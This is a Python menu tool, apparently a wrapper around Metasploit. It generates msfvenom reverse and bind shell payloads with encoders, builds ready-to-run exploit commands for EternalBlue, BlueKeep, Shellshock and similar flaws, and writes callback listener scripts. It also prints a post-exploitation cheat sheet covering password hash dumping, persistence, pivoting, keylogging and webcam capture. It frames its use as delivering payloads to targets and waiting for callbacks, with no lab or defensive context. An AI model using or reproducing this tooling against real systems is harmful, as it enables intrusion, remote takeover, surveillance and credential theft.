# metasploit command builder & payload generator
import os, subprocess, json
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()

def clr():
    os.system('clear')

def runcmd(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return p.stdout + p.stderr
    except:
        return "[!] failed"

def pause():
    Prompt.ask("\n[dim]enter to continue[/dim]")


# common metasploit payloads organized by platform/type
PAYLOADS = {
    "reverse_tcp": {
        "windows": "windows/meterpreter/reverse_tcp",
        "linux": "linux/x86/meterpreter/reverse_tcp",
        "linux_64": "linux/x64/meterpreter/reverse_tcp",
        "android": "android/meterpreter/reverse_tcp",
        "php": "php/meterpreter/reverse_tcp",
        "python": "python/meterpreter/reverse_tcp",
        "jsp": "java/jsp_shell_reverse_tcp",
        "asp": "windows/meterpreter/reverse_tcp",
    },
    "reverse_http": {
        "windows": "windows/meterpreter/reverse_http",
        "windows_ssl": "windows/meterpreter/reverse_https",
    },
    "bind_tcp": {
        "windows": "windows/meterpreter/bind_tcp",
        "linux": "linux/x86/meterpreter/bind_tcp",
        "linux_64": "linux/x64/meterpreter/bind_tcp",
    },
    "shell_reverse": {
        "windows": "windows/shell_reverse_tcp",
        "linux": "linux/x86/shell_reverse_tcp",
        "linux_64": "linux/x64/shell_reverse_tcp",
    },
    "staged": {
        "windows_x64": "windows/x64/meterpreter/reverse_tcp",
        "windows_x86": "windows/meterpreter/reverse_tcp",
        "linux_x64": "linux/x64/meterpreter/reverse_tcp",
        "linux_x86": "linux/x86/meterpreter/reverse_tcp",
    }
}

# common exploits
EXPLOITS = {
    "1": ("smb", "exploit/windows/smb/ms17_010_eternalblue", "EternalBlue - SMB RCE (MS17-010)"),
    "2": ("ssh", "exploit/multi/ssh/sshexec", "SSH Command Execution"),
    "3": ("apache", "exploit/multi/http/apache_mod_cgi_bash_env_exec", "Shellshock (Apache CGI)"),
    "4": ("php", "exploit/unix/webapp/php_reverse_shell", "PHP Reverse Shell"),
    "5": ("tomcat", "exploit/multi/http/tomcat_mgr_upload", "Tomcat Manager Upload"),
    "6": ("smb", "exploit/windows/smb/psexec", "PsExec - SMB RCE"),
    "7": ("rdp", "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "BlueKeep - RDP RCE"),
    "8": ("mysql", "exploit/multi/mysql/mysql_udf_payload", "MySQL UDF Payload"),
    "9": ("vsftpd", "exploit/unix/ftp/vsftpd_234_backdoor", "vsftpd 2.3.4 Backdoor"),
    "10": ("web", "exploit/multi/http/struts2_content_type_ognl", "Apache Struts RCE"),
    "11": ("web", "exploit/multi/http/jenkins_script_console", "Jenkins Script Console RCE"),
    "12": ("smb", "exploit/windows/smb/ms08_067_netapi", "MS08-067 - NetAPI"),
}

# msfvenom formats
OUTPUT_FORMATS = {
    "1": ("exe", "Windows EXE"),
    "2": ("elf", "Linux ELF"),
    "3": ("elf-shared", "Linux Shared Object"),
    "4": ("msi", "Windows MSI"),
    "5": ("msi-nouac", "Windows MSI (no UAC)"),
    "6": ("ps1", "PowerShell Script"),
    "7": ("jsp", "JSP Payload"),
    "8": ("war", "WAR Payload"),
    "9": ("asp", "ASP Payload"),
    "10": ("php", "PHP Payload"),
    "11": ("py", "Python Payload"),
    "12": ("bash", "Bash Payload"),
    "13": ("c", "C Source"),
    "14": ("hex", "Hex String"),
}


def msfvenom_builder():
    clr()
    console.print("[bold red]=== MSFVENOM PAYLOAD BUILDER ===[/bold red]\n")
    
    # pick platform
    console.print("[yellow]target platform:[/yellow]")
    console.print("  [1] Windows")
    console.print("  [2] Linux")
    console.print("  [3] Android")
    console.print("  [4] PHP (web shell)")
    console.print("  [5] JSP (java)")
    console.print("  [6] Python")
    console.print("  [7] ASP")
    console.print("  [8] Custom (type your own)")
    platform = Prompt.ask("[cyan]pick[/cyan]")
    
    # pick payload type
    console.print("\n[yellow]payload type:[/yellow]")
    console.print("  [1] meterpreter reverse tcp (default, connects back to you)")
    console.print("  [2] meterpreter reverse http/s (goes through web)")
    console.print("  [3] bind tcp (listens on target)")
    console.print("  [4] shell reverse tcp (simple shell, no meterpreter)")
    ptype = Prompt.ask("[cyan]pick[/cyan]", default="1")
    
    # get payload
    if platform == "8":
        payload = Prompt.ask("[cyan]enter full payload path[/cyan]")
    else:
        try:
            if ptype == "1":
                payload = PAYLOADS["reverse_tcp"].get(f"platform_{platform}", "generic/shell_reverse_tcp")
            elif ptype == "2":
                payload = PAYLOADS["reverse_http"].get("windows", "generic/shell_reverse_tcp")
            elif ptype == "3":
                payload = PAYLOADS["bind_tcp"].get("windows", "generic/shell_bind_tcp")
            else:
                payload = PAYLOADS["shell_reverse"].get("windows", "generic/shell_reverse_tcp")
        except:
            payload = "generic/shell_reverse_tcp"
        
        # map platform number
        plat_map = {
            "1": "windows", "2": "linux", "3": "android", 
            "4": "php", "5": "jsp", "6": "python", "7": "asp"
        }
        ptype_map = {
            "1": "reverse_tcp", "2": "reverse_http", 
            "3": "bind_tcp", "4": "shell_reverse"
        }
        
        plat_key = plat_map.get(platform, "windows")
        ptype_key = ptype_map.get(ptype, "reverse_tcp")
        payload = PAYLOADS.get(ptype_key, {}).get(plat_key, "generic/shell_reverse_tcp")
    
    console.print(f"\n[green]selected payload: {payload}[/green]")
    
    # LHOST/LPORT for reverse payloads
    lhost = ""
    lport = ""
    if "reverse" in payload or "bind" not in payload:
        lhost = Prompt.ask("[cyan]LHOST (your IP)[/cyan]", default="0.0.0.0")
        lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    # extra options
    encoder = Prompt.ask("[cyan]encoder (empty = none, type list for options)[/cyan]", default="")
    if encoder == "list":
        console.print("[yellow]common encoders:[/yellow]")
        console.print("  x86/shikata_ga_nai")
        console.print("  x64/xor") 
        console.print("  x64/xor_dynamic")
        console.print("  php/encoder_base64")
        console.print("  ruby/base64")
        console.print("  generic/none")
        encoder = Prompt.ask("[cyan]encoder[/cyan]", default="")
    
    iterations = Prompt.ask("[cyan]encoder iterations[/cyan]", default="1")
    
    # output format
    console.print("\n[yellow]output format:[/yellow]")
    for k, (_, desc) in sorted(OUTPUT_FORMATS.items()):
        console.print(f"  [{k}] {desc}")
    fmt_choice = Prompt.ask("[cyan]format[/cyan]", default="1")
    fmt = OUTPUT_FORMATS.get(fmt_choice, ("exe", "EXE"))[0]
    
    outfile = Prompt.ask("[cyan]output filename[/cyan]", default=f"/tmp/payload.{fmt}")
    
    # build the command
    cmd_parts = ["msfvenom"]
    cmd_parts.append(f"-p {payload}")
    if lhost:
        cmd_parts.append(f"LHOST={lhost}")
    if lport:
        cmd_parts.append(f"LPORT={lport}")
    if encoder and encoder != "none":
        cmd_parts.append(f"-e {encoder}")
        if iterations and iterations != "1":
            cmd_parts.append(f"-i {iterations}")
    cmd_parts.append(f"-f {fmt}")
    cmd_parts.append(f"-o {outfile}")
    
    full_cmd = " ".join(cmd_parts)
    
    # display the command nicely
    console.print("\n" + "="*60)
    console.print(Panel(
        f"[bold green]{full_cmd}[/bold green]",
        title="[bold]GENERATED COMMAND[/bold]",
        border_style="green",
        box=box.DOUBLE
    ))
    console.print("="*60)
    
    # setup instructions
    console.print("\n[bold yellow]--- SETUP INSTRUCTIONS ---[/bold yellow]\n")
    console.print("[1] generate the payload:")
    console.print(f"    [cyan]{full_cmd}[/cyan]\n")
    console.print("[2] start the metasploit listener:")
    console.print(f"    [cyan]msfconsole -q -x 'use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'[/cyan]\n")
    console.print("[3] deliver the payload to target and wait for callback\n")
    
    # also show the resource script version
    console.print("[bold yellow]--- RESOURCE SCRIPT (auto-setup) ---[/bold yellow]\n")
    resource = f"""use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z"""
    console.print(f"[cyan]{resource}[/cyan]")
    
    res_file = Prompt.ask("\n[cyan]save resource script? (path, or empty to skip)[/cyan]", default="")
    if res_file:
        with open(res_file, 'w') as f:
            f.write(resource)
        console.print(f"[green]saved to {res_file}[/green]")
        console.print(f"[dim]run with: msfconsole -r {res_file}[/dim]")
    
    pause()

def exploit_browser():
    clr()
    console.print("[bold red]=== EXPLOIT BROWSER ===[/bold red]\n")
    
    console.print("[yellow]available exploits:[/yellow]\n")
    t = Table(box=box.SIMPLE)
    t.add_column("#", style="bold")
    t.add_column("Type", style="cyan")
    t.add_column("Module")
    t.add_column("Description")
    for k, (typ, mod, desc) in EXPLOITS.items():
        t.add_row(k, typ, mod, desc)
    console.print(t)
    
    choice = Prompt.ask("\n[cyan]pick exploit number (or 0 to go back)[/cyan]")
    if choice == "0" or choice not in EXPLOITS:
        return
    
    typ, module, desc = EXPLOITS[choice]
    console.print(f"\n[green]{desc}[/green]")
    console.print(f"[green]{module}[/green]\n")
    
    # build options
    rhost = Prompt.ask("[cyan]RHOST (target IP)[/cyan]")
    rport = Prompt.ask("[cyan]RPORT (target port)", default=get_default_port(typ))
    lhost = Prompt.ask("[cyan]LHOST (your IP)[/cyan]", default="0.0.0.0")
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    # figure out payload
    console.print("\n[yellow]recommended payload: windows/meterpreter/reverse_tcp[/yellow]")
    payload = Prompt.ask("[cyan]payload[/cyan]", default="windows/meterpreter/reverse_tcp")
    
    # full msfconsole command
    console.print("\n" + "="*60)
    console.print("[bold yellow]--- FULL METASPLOIT COMMAND ---[/bold yellow]\n")
    
    full = f"""msfconsole -q -x '
use {module}
set RHOST {rhost}
set RPORT {rport}
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
show options
exploit
'"""
    console.print(f"[cyan]{full}[/cyan]")
    console.print("\n" + "="*60)
    
    # also show individual commands
    console.print("\n[bold yellow]--- STEP BY STEP ---[/bold yellow]\n")
    console.print(f"  1. [cyan]msfconsole[/cyan]")
    console.print(f"  2. [cyan]use {module}[/cyan]")
    console.print(f"  3. [cyan]set RHOST {rhost}[/cyan]")
    console.print(f"  4. [cyan]set RPORT {rport}[/cyan]")
    console.print(f"  5. [cyan]set payload {payload}[/cyan]")
    console.print(f"  6. [cyan]set LHOST {lhost}[/cyan]")
    console.print(f"  7. [cyan]set LPORT {lport}[/cyan]")
    console.print(f"  8. [cyan]show options[/cyan]  (verify settings)")
    console.print(f"  9. [cyan]exploit[/cyan]  (or [cyan]exploit -j[/cyan] for background)")
    
    # save option
    save = Prompt.ask("\n[cyan]save to msf resource script? (path or empty)[/cyan]", default="")
    if save:
        with open(save, 'w') as f:
            f.write(f"use {module}\n")
            f.write(f"set RHOST {rhost}\n")
            f.write(f"set RPORT {rport}\n")
            f.write(f"set payload {payload}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write(f"set LPORT {lport}\n")
            f.write("exploit\n")
        console.print(f"[green]saved to {save}[/green]")
    
    pause()

def get_default_port(typ):
    ports = {"smb": "445", "ssh": "22", "apache": "80", "php": "80", 
             "tomcat": "8080", "rdp": "3389", "mysql": "3306", 
             "vsftpd": "21", "web": "80"}
    return ports.get(typ, "80")

def meterpreter_cmds():
    clr()
    console.print("[bold red]=== METERPRETER CHEAT SHEET ===[/bold red]\n")
    
    cheatsheet = """[yellow]--- Basic ---[/yellow]
  help                  show all commands
  sysinfo               target system info
  getuid                current user
  getprivs              get privilege info
  pwd                   current directory
  cd                    change directory
  ls / dir              list files
  download <file>       download file from target
  upload <file>         upload file to target
  shell                 drop to system shell
  background            background session

[yellow]--- Privilege Escalation ---[/yellow]
  getsystem             try to get SYSTEM
  getprivs              check available privs
  hashdump              dump password hashes
  run post/multi/recon/local_exploit_suggester

[yellow]--- Pivoting ---[/yellow]
  run autoroute -s <subnet>    add route through session
  run autoroute -p              print routes
  background                    background session, then:
  use auxiliary/server/socks_proxy  (for proxychains)

[yellow]--- Persistence ---[/yellow]
  run persistence -U -i 10 -p <port> -r <lhost>
  run metsvc             install as service

[yellow]--- Recon ---[/yellow]
  arp                     ARP cache
  netstat                 network connections
  ps                      process list
  tasklist                running tasks
  screenshot              capture screen
  screenshare             live screen share
  keyscan_start           start keylogger
  keyscan_dump            dump keystrokes
  webcam_snap             take webcam photo
  enumdesktops            list desktops
  idletime                idle time

[yellow]--- Post Exploitation ---[/yellow]
  run post/windows/gather/enum_domain
  run post/windows/gather/smart_hashdump
  run post/linux/gather/enum_network
  run post/linux/gather/enum_system
  run post/multi/gather/env
  run post/multi/gather/ssh_creds

[yellow]--- File System ---[/yellow]
  edit <file>             edit a file
  cat <file>              read file
  mkdir                   create directory
  rm                      delete file
  search -f *.txt         search for files

[yellow]--- Networking ---[/yellow]
  portfwd add -l <port> -p <rport> -r <rhost>
  portfwd list
  portfwd delete
"""
    console.print(cheatsheet)
    pause()

def msfvenom_all_formats():
    clr()
    console.print("[bold red]=== MSFVENOM ALL OUTPUT FORMATS ===[/bold red]\n")
    
    for k, (fmt, desc) in sorted(OUTPUT_FORMATS.items()):
        console.print(f"  {k:3s}. {fmt:15s} {desc}")
    
    console.print("\n[dim]usage: -f <format> in msfvenom command[/dim]")
    pause()

def resource_script_gen():
    clr()
    console.print("[bold red]=== RESOURCE SCRIPT GENERATOR ===[/bold red]\n")
    console.print("[dim]build an auto-running metasploit script[/dim]\n")
    
    lines = []
    lines.append("# auto-generated resource script")
    
    while True:
        console.print("[yellow]add action:[/yellow]")
        console.print("  [1] set option")
        console.print("  [2] use module")
        console.print("  [3] exploit")
        console.print("  [4] custom command")
        console.print("  [5] done / save")
        
        c = Prompt.ask("[cyan]pick[/cyan]")
        
        if c == "1":
            opt = Prompt.ask("[cyan]option name[/cyan]")
            val = Prompt.ask("[cyan]value[/cyan]")
            lines.append(f"set {opt} {val}")
        elif c == "2":
            mod = Prompt.ask("[cyan]module path[/cyan]")
            lines.append(f"use {mod}")
        elif c == "3":
            lines.append("exploit -j")
        elif c == "4":
            cmd = Prompt.ask("[cyan]raw msf command[/cyan]")
            lines.append(cmd)
        elif c == "5":
            break
    
    script = "\n".join(lines)
    console.print(f"\n[green]generated script:[/green]\n")
    console.print(f"[cyan]{script}[/cyan]")
    
    path = Prompt.ask("\n[cyan]save to (empty to skip)[/cyan]", default="")
    if path:
        with open(path, 'w') as f:
            f.write(script)
        console.print(f"[green]saved! run with: msfconsole -r {path}[/green]")
    
    pause()


def run():
    while True:
        clr()
        console.print("[bold red]=== METASPLOIT FRAMEWORK ===[/bold red]\n")
        
        # check if msf is installed
        msf_found = os.path.exists("/usr/bin/msfconsole") or os.path.exists("/usr/bin/msfvenom")
        if msf_found:
            console.print("[green]metasploit detected[/green]\n")
        else:
            console.print("[yellow]metasploit not found in PATH[/yellow]")
            console.print("[dim]install: https://www.metasploit.com/download[/dim]")
            console.print("[dim]or: pacman -S metasploit (on some distros)[/dim]\n")
        
        from rich.table import Table
        t = Table(show_header=False, box=box.ROUNDED, border_style="red", padding=(0, 2))
        t.add_column("", style="bold yellow", width=4)
        t.add_column("")
        opts = [
            "Payload Builder (msfvenom)",
            "Exploit Browser",
            "Meterpreter Cheat Sheet",
            "Output Format Reference",
            "Resource Script Generator",
            "Launch msfconsole",
        ]
        for i, o in enumerate(opts, 1):
            t.add_row(str(i), o)
        t.add_row("", "")
        t.add_row("b", "Back")
        console.print(Panel(t, title="[bold]METASPLOIT[/bold]", border_style="red"))
        
        try:
            c = int(Prompt.ask("[bold yellow]>[/bold yellow]"))
        except ValueError:
            c = 0
        
        if c == 1: msfvenom_builder()
        elif c == 2: exploit_browser()
        elif c == 3: meterpreter_cmds()
        elif c == 4: msfvenom_all_formats()
        elif c == 5: resource_script_gen()
        elif c == 6:
            if msf_found:
                console.print("[yellow]launching msfconsole... (it will take over this terminal)[/yellow]")
                Prompt.ask("[dim]enter to launch[/dim]")
                os.system("msfconsole")
            else:
                console.print("[red]metasploit not installed[/red]")
                pause()
        elif c == 0: return
